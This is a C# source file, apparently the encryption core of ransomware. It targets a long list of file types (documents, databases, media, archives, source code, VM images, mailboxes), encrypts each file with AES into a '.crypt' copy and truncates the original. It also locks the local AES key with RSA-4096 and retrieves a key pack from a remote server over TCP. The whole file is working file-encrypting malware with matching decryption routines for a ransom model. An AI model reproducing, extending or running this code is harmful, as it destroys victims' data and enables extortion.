using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace VortexSecOps
{
    namespace AesRsaCipherMix
    {
        public class AesRandomKeyPack
        {
            private string _aesKey;
            private string _key;
            /// <summary>
            /// 随机密钥
            /// </summary>
            public string Key
            {
                get { return _key.Clone().ToString(); }
                private set { _key = value; }
            }
            /// <summary>
            /// RSA私钥
            /// </summary>
            public string AesKey
            {
                get { return _aesKey.Clone().ToString(); }
                private set { _aesKey = value; }
            }
            public AesRandomKeyPack(string PrivateKey, string Key)
            {
                this.AesKey = PrivateKey;
                this.Key = Key;
            }
            public string CombineKeys()
            {
                string[] Combine = { this.Key, this.AesKey };
                string strs = "----###5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq32861760876409234953718261392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e2861392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq328617608764092349537182###----";
                return Combine[0] + strs + Combine[1];
            }
        }
        public interface IAesRsaCryptographyService
        {
            /// <summary>
            /// 用AES加密文件
            /// </summary>
            /// <param name="filepath">文件路径</param>
            /// <param name="Key">AES密钥</param>
            void EncryptFileWithAesKey(string filepath, byte[] Key, bool debug = false);
            /// <summary>
            /// 用AES解密文件
            /// </summary>
            /// <param name="filepath">文件路径</param>
            /// <param name="Key">AES密钥</param>
            void DecryptFileWithAesKey(string filepath, byte[] Key);
            /// <summary>
            /// 用RSA加密AES密钥
            /// </summary>
            /// <param name="PublicKey">RSA公钥的XML字符串</param>
            void EncryptAesKeyWithRsa(string PublicKey);
            /// <summary>
            /// 用RSA解密AES密钥
            /// </summary>
            void DecryptAesKeyWithRsa(string PrivateKey);
        }
        /// <summary>
        ///  该类用于封装 AES 加密所需的密钥（Key）和初始化向量（IV）。
        /// 它提供了对密钥和初始化向量的安全管理，确保密钥长度符合 AES 规范。
        /// </summary>
        public class AesKeyAndIv
        {
            private byte[] _key;
            private byte[] _iv;
            public byte[] Key
            {
                get { return _key?.Clone() as byte[]; }
                private set
                {
                    if (value == null || (value.Length != 32 && value.Length != 24 && value.Length != 16))
                    {
                        throw new ArgumentException("AES 密钥长度必须为 16、24 或 32 字节。");
                    }
                    _key = value;
                }
            }
            public byte[] Iv
            {
                get { return _iv?.Clone() as byte[]; }
                private set
                {
                    if (value == null || value.Length != 16)
                    {
                        throw new ArgumentException("初始化向量必须为16字节");
                    }
                    _iv = value;
                }
            }
            private AesKeyAndIv(byte[] Key, byte[] Iv)
            {
                this.Key = Key;
                this.Iv = Iv;
            }
            /// <summary>
            /// 用于创建 AesKeyAndIv 类的新实例。
            /// </summary>
            /// <param name="Key">AES 加密使用的密钥，长度必须为 16、24 或 32 字节。</param>
            /// <param name="Iv">AES 加密使用的初始化向量，长度必须为 16 字节。</param>
            /// <returns></returns>
            public static AesKeyAndIv CreateNewAes(byte[] Key, byte[] Iv)
            {
                return new AesKeyAndIv(Key, Iv);
            }
        }
        public class AesRsaEncryptionManager : IAesRsaCryptographyService
        {
            private const string AES_KEY_FILE_PATH = @"C:\bin\AES_Key.bin";
            public const string AES_KEY_ENCRYPTED_FILE_PATH = @"C:\bin\AES_Key.bin.Encrypt";
            public static string[] encryptedFileExtensions = {
                 // 办公文档
                 "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.odt", "*.ods", "*.odp", "*.pdf", "*.rtf", "*.txt", "*.csv", "*.log",
                 // 数据库文件
                 "*.sql", "*.mdb", "*.db", "*.sqlite", "*.dbf", "*.accdb", "*.bak",
                 // 图片文件
                 "*.jpg", "*.jpeg", "*.png", "*.tif", "*.tiff", "*.ico", "*.bmp", "*.gif", "*.svg", "*.psd", "*.ai", "*.eps", "*.raw", "*.cr2", "*.nef",
                 // 视频文件
                 "*.mp4", "*.avi", "*.mov", "*.mkv", "*.flv", "*.wmv", "*.mpeg", "*.mpg", "*.3gp", "*.webm", "*.vob",
                 // 音频文件
                 "*.mp3", "*.wav", "*.flac", "*.ogg", "*.aac", "*.m4a", "*.wma", "*.mid", "*.amr",
                 // 压缩文件
                 "*.zip", "*.rar", "*.7z", "*.tar", "*.gz", "*.bz2", "*.xz",
                 // 可执行文件
                 "*.exe", "*.msi", "*.com", "*.bat", "*.sh", "*.ps1",
                 // 配置文件
                 "*.ini", "*.json", "*.xml", "*.cfg", "*.conf", "*.reg",
                 // 脚本文件
                 "*.py", "*.js", "*.php", "*.rb", "*.lua", "*.pl", "*.vb",
                 // 设计文件
                 "*.indd", "*.cdr", "*.xd", "*.sketch",
                 // 邮件文件
                 "*.eml", "*.msg", "*.pst", "*.ost",
                 // 工程文件
                  "*.vcxproj", "*.sln", "*.csproj", "*.fsproj", "*.java", "*.class", "*.cs", "*.cpp", "*.h", "*.hpp",
                 // 虚拟机文件
                 "*.vmdk", "*.vdi", "*.ova", "*.ovf",
                 // 网页文件
                 "*.html", "*.htm", "*.css", "*.jsx",
                 // 电子书文件
                 "*.epub", "*.mobi", "*.azw3",
                 // 其他杂项
                 "*.iso", "*.bin", "*.dat", "*.swf", "*.xps"
             };
            /// <summary>
            /// 不允许外部直接实例化
            /// </summary>
            private AesRsaEncryptionManager() { }
            /// <summary>
            /// 创建AesKey对象的特定方法，实例化此类必须使用IAesKey接口
            /// </summary>
            /// <returns>新的AesRsaEncryptionManager实例</returns>
            public static IAesRsaCryptographyService Create()
            {
                if (!Directory.Exists(@"C:\bin"))
                {
                    Directory.CreateDirectory(@"C:\bin");
                }
                return new AesRsaEncryptionManager();
            }
            public static string GetSHA256(byte[] bytes)
            {
                string strHash256 = null;
                using (SHA256 sha256 = SHA256Cng.Create())
                {
                    try
                    {
                        byte[] hash = sha256.ComputeHash(bytes);
                        StringBuilder stringBuilder = new StringBuilder();
                        foreach (byte b in hash)
                        {
                            stringBuilder.Append(b.ToString("x2"));
                        }
                        strHash256 = stringBuilder.ToString();
                    }
                    catch (Exception)
                    {

                    }
                }
                if (strHash256 is null)
                {
                    return string.Empty;
                }
                else
                {
                    return strHash256;
                }
            }
            /// <summary>
            /// 通过TCP协议从指定服务器获取RsaRandomKeyPack实例
            /// </summary>
            /// <param name="ipAddress">目标服务器的IP地址（IPv4格式）</param>
            /// <param name="aesKeyAndIv">用于解密从服务器接收数据的AES密钥和初始化向量</param>
            /// <param name="serverPort">目标服务器端口，默认值为8888</param>
            /// <returns>RsaRandomKeyPack实例</returns>
            /// <exception cref="TimeoutException">当连接服务器超时，抛出此异常。</exception>
            /// <exception cref="GetAesKeyException">当接收到的密钥格式无效或验证失败时触发此异常</exception>
            public static async Task<AesRandomKeyPack> GetRemoteAesKey(string ipAddress, AesKeyAndIv aesKeyAndIv, int serverPort = 8888)
            {
                string key;
                using (TcpClient tcpClient = new TcpClient())
                {
                    string localip = "127.0.0.1";
                    IPAddress[] ips = Dns.GetHostAddresses(Dns.GetHostName());
                    foreach (IPAddress ip in ips)
                    {
                        if (!ip.IsIPv6SiteLocal)
                        {
                            localip = ip.ToString();
                        }
                    }
                    using (CancellationTokenSource cancellationTokenSource = new CancellationTokenSource(20000))
                    {
                        Task connectTask = tcpClient.ConnectAsync(ipAddress, serverPort);
                        Task timeTask = Task.Delay(-1, cancellationTokenSource.Token);
                        if (await Task.WhenAny(connectTask, timeTask) == timeTask)
                        {
                            throw new TimeoutException("连接超时，请检查服务器状态。");
                        }
                        using (NetworkStream networkStream = tcpClient.GetStream())
                        {
                            using (BinaryReader binaryReader = new BinaryReader(networkStream))
                            {
                                key = AesDecrypt(Convert.FromBase64String(binaryReader.ReadString()), aesKeyAndIv);
                            }
                        }
                        string[] strs = { "----###5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq32861760876409234953718261392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e2861392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq328617608764092349537182###----" };
                        string[] tcpMessage = key.Split(strs, StringSplitOptions.RemoveEmptyEntries);
                        if (key.Length == 0 || tcpMessage.Length < 2 || tcpMessage[0] == key)
                        {
                            throw new GetAesKeyException("无法验证获取的密钥");
                        }
                        return new AesRandomKeyPack(tcpMessage[1], tcpMessage[0]);
                    }
                }
            }
            /// <summary>
            /// 通过TCP协议从指定服务器获取RsaRandomKeyPack实例
            /// </summary>
            /// <param name="ipAddress">目标服务器的IP地址（IPv4格式）</param>
            /// <param name="serverPort">目标服务器端口，默认值为8888</param>
            /// <returns>RsaRandomKeyPack实例</returns>
            /// <exception cref="TimeoutException">当连接服务器超时，抛出此异常。</exception>
            /// <exception cref="GetAesKeyException">当接收到的密钥格式无效或验证失败时触发此异常</exception>
            public static async Task<AesRandomKeyPack> GetRemoteAesKey(string ipAddress, int serverPort = 8888)
            {
                string key;
                using (TcpClient tcpClient = new TcpClient())
                {
                    string localip = "127.0.0.1";
                    IPAddress[] ips = Dns.GetHostAddresses(Dns.GetHostName());
                    foreach (IPAddress ip in ips)
                    {
                        if (!ip.IsIPv6SiteLocal)
                        {
                            localip = ip.ToString();
                        }
                    }
                    using (CancellationTokenSource cancellationTokenSource = new CancellationTokenSource(20000))
                    {
                        Task connectTask = tcpClient.ConnectAsync(ipAddress, serverPort);
                        Task timeTask = Task.Delay(-1, cancellationTokenSource.Token);
                        if (await Task.WhenAny(connectTask, timeTask) == timeTask)
                        {
                            throw new TimeoutException("连接超时，请检查服务器状态。");
                        }
                        using (NetworkStream networkStream = tcpClient.GetStream())
                        {
                            using (BinaryReader binaryReader = new BinaryReader(networkStream))
                            {
                                key = binaryReader.ReadString();
                            }
                        }
                        string[] strs = { "----###5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq32861760876409234953718261392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e2861392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq328617608764092349537182###----" };
                        string[] tcpMessage = key.Split(strs, StringSplitOptions.RemoveEmptyEntries);
                        if (key.Length == 0 || tcpMessage.Length < 2 || tcpMessage[0] == key)
                        {
                            throw new GetAesKeyException("无法验证获取的密钥");
                        }
                        return new AesRandomKeyPack(tcpMessage[1], tcpMessage[0]);
                    }
                }
            }
            /// <summary>用 AES 加密字符串</summary>
            /// <param name="plainText">明文字符串</param>
            /// <param name="aesKeyAndIv">AES 密钥和初始化向量</param>
            /// <returns>加密后的字节数组</returns>
            public static byte[] AesEncrypt(string plainText, AesKeyAndIv aesKeyAndIv)
            {
                byte[] encryped;
                using (var aes = Aes.Create())
                {
                    aes.Key = aesKeyAndIv.Key;
                    aes.IV = aesKeyAndIv.Iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    ICryptoTransform cryptoTransform = aes.CreateEncryptor();
                    using (MemoryStream memory = new MemoryStream())
                    {
                        using (CryptoStream crypto = new CryptoStream(memory, cryptoTransform, CryptoStreamMode.Write))
                        {
                            using (StreamWriter streamWriter = new StreamWriter(crypto))
                            {
                                streamWriter.Write(plainText);
                            }
                        }
                        encryped = memory.ToArray();
                    }
                }
                return encryped;
            }
            /// <summary>用 AES 解密字符串</summary>
            /// <param name="encryped">加密后的字节数组</param>
            /// <param name="aesKeyAndIv">AES 密钥和初始化向量</param>
            /// <returns>解密后的明文字符串</returns>
            public static string AesDecrypt(byte[] encryped, AesKeyAndIv aesKeyAndIv)
            {
                string plaintext = null;
                using (var aes = Aes.Create())
                {
                    aes.Key = aesKeyAndIv.Key;
                    aes.IV = aesKeyAndIv.Iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    ICryptoTransform cryptoTransform = aes.CreateDecryptor();
                    using (MemoryStream memory = new MemoryStream(encryped))
                    {
                        using (CryptoStream crypto = new CryptoStream(memory, cryptoTransform, CryptoStreamMode.Read))
                        {
                            using (StreamReader streamReader = new StreamReader(crypto))
                            {
                                plaintext = streamReader.ReadToEnd();
                            }
                        }
                    }
                }
                return plaintext;
            }
            /// <summary>用 RSA 加密字节数组</summary>
            /// <param name="plainTextBytes">待加密的字节数组</param>
            /// <param name="PublicKey">RSA 公钥的 XML 字符串</param>
            /// <returns>加密后的字节数组</returns>
            public static byte[] RsaEncrypt(byte[] plainTextBytes, string PublicKey)
            {
                byte[] cipherText;
                using (var rSA = new RSACng(4096))
                {
                    rSA.FromXmlString(PublicKey);
                    cipherText = rSA.Encrypt(plainTextBytes, RSAEncryptionPadding.OaepSHA512);
                }
                return cipherText;
            }
            /// <summary>用 RSA 解密字节数组</summary>
            /// <param name="cipherText">待解密的字节数组</param>
            /// <param name="PrivateKey">RSA 私钥</param>
            /// <returns>解密后的字节数组</returns>
            public static byte[] RsaDecrypt(byte[] cipherText, string PrivateKey)
            {
                byte[] plainTextBytes;
                using (var rSA = new RSACng(4096))
                {
                    rSA.FromXmlString(PrivateKey);
                    plainTextBytes = rSA.Decrypt(cipherText, RSAEncryptionPadding.OaepSHA512);
                }
                return plainTextBytes;
            }
            void IAesRsaCryptographyService.EncryptAesKeyWithRsa(string PublicKey)
            {
                using (var rSA = new RSACng(4096))
                {
                    rSA.FromXmlString(PublicKey);
                    if (File.Exists(AES_KEY_FILE_PATH))
                    {
                        try
                        {
                            byte[] AES_Key = File.ReadAllBytes(AES_KEY_FILE_PATH);
                            byte[] AES_Key_Encrypt = rSA.Encrypt(AES_Key, RSAEncryptionPadding.OaepSHA512);
                            File.WriteAllBytes(AES_KEY_ENCRYPTED_FILE_PATH, AES_Key_Encrypt);
                            File.WriteAllBytes(AES_KEY_FILE_PATH, new byte[0]);
                        }
                        catch (Exception)
                        {
                            return;
                        }
                    }
                }
            }
            void IAesRsaCryptographyService.DecryptAesKeyWithRsa(string PrivateKey)
            {
                using (RSA rSA = new RSACng(4096))
                {
                    rSA.FromXmlString(PrivateKey);
                    if (File.Exists(AES_KEY_ENCRYPTED_FILE_PATH))
                    {
                        try
                        {
                            byte[] AES_Key = File.ReadAllBytes(AES_KEY_ENCRYPTED_FILE_PATH);
                            byte[] AES_Key_Decrypt = rSA.Decrypt(AES_Key, RSAEncryptionPadding.OaepSHA512);
                            File.WriteAllBytes(AES_KEY_FILE_PATH, AES_Key_Decrypt);
                            File.Delete(AES_KEY_ENCRYPTED_FILE_PATH);
                        }
                        catch (Exception)
                        {
                            return;
                        }
                    }
                }
            }
            void IAesRsaCryptographyService.EncryptFileWithAesKey(string filepath, byte[] Key, bool debug)
            {
                int buffersize;
                FileInfo fileInfo = new FileInfo(filepath);
                if (fileInfo.Length > 1024 * 1024 && fileInfo.Length <= 1024 * 1024 * 100)
                {
                    buffersize = 1024 * 20;
                }
                else if (fileInfo.Length > 1024 * 1024 * 100 && fileInfo.Length <= 1024 * 1024 * 1024)
                {
                    buffersize = 1024 * 64;
                }
                else if (fileInfo.Length > 1024 * 1024 * 1024)
                {
                    buffersize = 1024 * 256;
                }
                else
                {
                    buffersize = 1024 * 3;
                }
                byte[] buffer = new byte[buffersize];
                int readfile = 0;
                try
                {
                    if (filepath != AES_KEY_FILE_PATH && filepath != AES_KEY_ENCRYPTED_FILE_PATH)
                    {
                        if (File.Exists(filepath))
                        {
                            using (Aes aes = Aes.Create())
                            {
                                aes.BlockSize = 128;
                                aes.Key = Key;
                                aes.GenerateIV();
                                aes.Mode = CipherMode.CBC;
                                aes.Padding = PaddingMode.PKCS7;
                                string filepathencrypt = Path.ChangeExtension(filepath, $"{Path.GetExtension(filepath)}.crypt");
                                var cryptoTransform = aes.CreateEncryptor(aes.Key, aes.IV);
                                using (var fileStream = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.Read))
                                using (var fileStream1 = new FileStream(filepathencrypt, FileMode.Create, FileAccess.Write, FileShare.Write))
                                {
                                    fileStream1.Write(aes.IV, 0, 16);
                                    using (var crypto = new CryptoStream(fileStream1, cryptoTransform, CryptoStreamMode.Write))
                                    {
                                        while ((readfile = fileStream.Read(buffer, 0, buffersize)) > 0)
                                        {
                                            crypto.Write(buffer, 0, readfile);
                                        }
                                    }
                                }
                            }
                        }
                    }
                    File.WriteAllBytes(filepath, new byte[0]);
                }
                catch (Exception ex)
                {
                    if (debug)
                    {
                        try
                        {
                            using (StreamWriter sw = new StreamWriter(@"C:\encryptDebug.txt", true, Encoding.UTF8))
                            {
                                sw.WriteLine(ex.Message);
                                sw.WriteLine(ex.GetType().ToString());
                            }
                        }
                        catch (Exception)
                        {

                        }
                    }
                }
            }
            void IAesRsaCryptographyService.DecryptFileWithAesKey(string filepath, byte[] Key)
            {
                if (filepath != AES_KEY_FILE_PATH && filepath != AES_KEY_ENCRYPTED_FILE_PATH)
                {
                    int buffersize;
                    FileInfo fileInfo = new FileInfo(filepath);
                    if (fileInfo.Length > 1024 * 1024 && fileInfo.Length <= 1024 * 1024 * 100)
                    {
                        buffersize = 1024 * 20;
                    }
                    else if (fileInfo.Length > 1024 * 1024 * 100 && fileInfo.Length <= 1024 * 1024 * 1024)
                    {
                        buffersize = 1024 * 64;
                    }
                    else if (fileInfo.Length > 1024 * 1024 * 1024)
                    {
                        buffersize = 1024 * 256;
                    }
                    else
                    {
                        buffersize = 1024 * 3;
                    }
                    byte[] buffer = new byte[buffersize];
                    if (Key.Length != 32)
                    {
                        MessageBox.Show("导入的密钥不符合要求", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                    using (Aes aes = Aes.Create())
                    {
                        byte[] iv = new byte[16];
                        aes.Key = Key;
                        aes.Mode = CipherMode.CBC;
                        aes.Padding = PaddingMode.PKCS7;
                        try
                        {
                            if (File.Exists(filepath))
                            {
                                int readfile = 0;
                                string filename = Path.GetFileNameWithoutExtension(filepath);
                                string directory = Path.GetDirectoryName(filepath);
                                string newfilepath = Path.Combine(directory, filename);
                                using (FileStream fileStream = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.None))
                                using (FileStream fileStream1 = new FileStream(newfilepath, FileMode.Create, FileAccess.Write, FileShare.None))
                                {
                                    int readIV = fileStream.Read(iv, 0, 16);
                                    if (readIV < 16)
                                    {
                                        MessageBox.Show("文件损坏或未加密", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                        return;
                                    }
                                    aes.IV = iv;
                                    var crypt = aes.CreateDecryptor();
                                    using (CryptoStream crypto = new CryptoStream(fileStream, crypt, CryptoStreamMode.Read))
                                    {
                                        while ((readfile = crypto.Read(buffer, 0, buffersize)) > 0)
                                        {
                                            fileStream1.Write(buffer, 0, readfile);
                                        }
                                    }
                                }
                                Task.Run(async () =>
                                {
                                    await Task.Delay(200);
                                    File.Delete(filepath);
                                });
                            }
                        }
                        catch (Exception)
                        {

                        }
                    }
                }
            }
            public static byte[] LoadAesKey()
            {
                try
                {
                    using (Aes aes = Aes.Create())
                    {
                        if (!Directory.Exists(@"C:\bin"))
                        {
                            Directory.CreateDirectory(@"C:\bin");
                        }
                        if (!File.Exists(AES_KEY_FILE_PATH))
                        {
                            aes.KeySize = 256;
                            aes.GenerateKey();
                            File.WriteAllBytes(AES_KEY_FILE_PATH, aes.Key);
                        }
                        aes.Key = File.ReadAllBytes(AES_KEY_FILE_PATH);

                        if (aes.Key.Length != 32)
                        {
                            MessageBox.Show("导入的密钥不符合要求", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return new byte[0];
                        }

                        return aes.Key;
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"发生异常：{ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return new byte[0];
                }
            }
            public static string Random_Key()
            {
                // 创建一个Random对象，用于生成随机数
                Random random = new Random();
                // 将包含大小写字母和数字的字符串转换为字符数组，作为生成密钥的字符来源
                char[] KEYChar = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789".ToCharArray();
                // 创建一个长度为27的字符数组，用于存储生成的密钥字符
                char[] Key = new char[27];
                // 循环27次，每次生成一个随机索引，从KEYChar字符数组中选取对应字符放入Key数组中，以此构建密钥字符串
                for (int i = 0; i < 27; i++)
                {
                    int index = random.Next(0, KEYChar.Length);
                    Key[i] = KEYChar[index];
                }
                // 将生成的字符数组转换为字符串并返回，作为随机生成的密钥
                return new string(Key);
            }
        }
        /// <summary>
        /// 密钥格式无效或验证失败时触发此异常
        /// </summary>
        class GetAesKeyException : Exception
        {
            public GetAesKeyException() : base() { }
            public GetAesKeyException(string message) : base(message) { }
        }
    }
}